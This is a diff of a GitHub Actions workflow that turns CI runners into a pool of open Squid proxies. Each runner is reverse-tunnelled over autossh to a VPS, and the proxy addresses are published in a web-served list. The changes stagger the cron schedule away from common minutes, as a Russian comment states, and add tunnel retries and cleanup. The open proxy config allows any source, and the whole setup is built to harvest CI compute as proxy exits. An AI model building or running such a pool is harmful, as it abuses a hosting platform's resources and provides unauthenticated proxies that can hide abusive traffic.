@@ -3,7 +3,8 @@ name: Pool GH2
 on:
   workflow_dispatch:
   schedule:
-    - cron: "*/10 * * * *"
+    # Вместо */10 — смещённые минуты, чтобы не попадать в "популярные" точки
+    - cron: "7,17,27,37,47,57 * * * *"
 
 permissions:
   contents: read
@@ -12,6 +13,7 @@ jobs:
   run:
     name: Slot ${{ matrix.runner_id }}
     runs-on: ubuntu-22.04
+    timeout-minutes: 18
 
     strategy:
       fail-fast: false
@@ -24,26 +26,36 @@ jobs:
 
     steps:
       - name: Install
+        shell: bash
         run: |
+          set -e
           sudo apt update
-          sudo apt install -y squid autossh curl procps
+          sudo apt install -y squid autossh curl procps psmisc openssh-client
 
       - name: Squid
+        shell: bash
         run: |
+          set -e
           sudo tee /etc/squid/squid.conf >/dev/null <<'EOF'
           http_port 3128
           acl all src 0.0.0.0/0
           http_access allow all
           EOF
+          sudo systemctl enable squid
           sudo systemctl restart squid
           sleep 2
-          ss -lnt | grep ':3128' || exit 1
+          ss -lnt | grep ':3128' >/dev/null || exit 1
 
       - name: Stagger
-        run: sleep $((RUNNER_ID * 6))
+        shell: bash
+        run: |
+          set -e
+          sleep $((RUNNER_ID * 6))
 
       - name: SSH
+        shell: bash
         run: |
+          set -e
           mkdir -p ~/.ssh
           echo "${{ secrets.VPS_SSH_KEY }}" > ~/.ssh/key
           chmod 600 ~/.ssh/key
@@ -59,60 +71,74 @@ jobs:
             ConnectTimeout 10
             ServerAliveInterval 30
             ServerAliveCountMax 3
+            TCPKeepAlive yes
           EOF
 
           ssh vps "echo OK"
 
       - name: Run slot
+        shell: bash
         run: |
+          set -euo pipefail
+
           PORT=$((11000 + RUNNER_ID))
           echo "PORT=$PORT" >> "$GITHUB_ENV"
 
           start_tunnel() {
             ssh vps "fuser -k ${PORT}/tcp || true"
             pkill -f "autossh.*0.0.0.0:${PORT}:localhost:3128" || true
+            pkill -f "ssh.*0.0.0.0:${PORT}:localhost:3128" || true
 
             autossh -M 0 -N -f \
               -o ExitOnForwardFailure=yes \
               -o ServerAliveInterval=30 \
               -o ServerAliveCountMax=3 \
+              -o TCPKeepAlive=yes \
               -R 0.0.0.0:${PORT}:localhost:3128 \
               vps
           }
 
           verify_tunnel() {
             ssh vps "ss -lnt | grep ':${PORT} '" >/dev/null 2>&1 || return 1
-            ssh vps "curl -x http://127.0.0.1:${PORT} -s --max-time 10 https://api.ipify.org" >/dev/null 2>&1 || return 1
+            ssh vps "curl -x http://127.0.0.1:${PORT} -s --max-time 10 http://api.ipify.org" >/dev/null 2>&1 || return 1
             return 0
           }
 
           register_slot() {
             ssh vps "
               touch /var/www/html/proxies-gh2.txt /var/www/html/proxies-gh2-meta.txt
-              grep -v '^${RUNNER_ID}|' /var/www/html/proxies-gh2-meta.txt > /tmp/x.$$ 2>/dev/null || true
-              echo '${RUNNER_ID}|${VPS_IP}:${PORT}' >> /tmp/x.$$
-              sort -t'|' -k1,1n /tmp/x.$$ > /var/www/html/proxies-gh2-meta.txt
+              grep -v '^${RUNNER_ID}|' /var/www/html/proxies-gh2-meta.txt > /tmp/gh2meta.\$\$ 2>/dev/null || true
+              echo '${RUNNER_ID}|${VPS_IP}:${PORT}' >> /tmp/gh2meta.\$\$
+              sort -t'|' -k1,1n /tmp/gh2meta.\$\$ > /var/www/html/proxies-gh2-meta.txt
               cut -d'|' -f2 /var/www/html/proxies-gh2-meta.txt > /var/www/html/proxies-gh2.txt
-              rm -f /tmp/x.$$
+              rm -f /tmp/gh2meta.\$\$
             "
           }
 
           cleanup_slot() {
             ssh vps "
               touch /var/www/html/proxies-gh2.txt /var/www/html/proxies-gh2-meta.txt
-              grep -v '^${RUNNER_ID}|' /var/www/html/proxies-gh2-meta.txt > /tmp/x.$$ 2>/dev/null || true
-              sort -t'|' -k1,1n /tmp/x.$$ > /var/www/html/proxies-gh2-meta.txt
+              grep -v '^${RUNNER_ID}|' /var/www/html/proxies-gh2-meta.txt > /tmp/gh2meta.\$\$ 2>/dev/null || true
+              sort -t'|' -k1,1n /tmp/gh2meta.\$\$ > /var/www/html/proxies-gh2-meta.txt
               cut -d'|' -f2 /var/www/html/proxies-gh2-meta.txt > /var/www/html/proxies-gh2.txt
-              rm -f /tmp/x.$$
-            "
+              rm -f /tmp/gh2meta.\$\$
+            " || true
+
             pkill -f "autossh.*0.0.0.0:${PORT}:localhost:3128" || true
+            pkill -f "ssh.*0.0.0.0:${PORT}:localhost:3128" || true
           }
 
           trap cleanup_slot EXIT
 
           start_tunnel
           sleep 5
-          verify_tunnel || exit 1
+
+          if ! verify_tunnel; then
+            start_tunnel
+            sleep 5
+            verify_tunnel || exit 1
+          fi
+
           register_slot
 
           END=$(( $(date +%s) + 720 ))
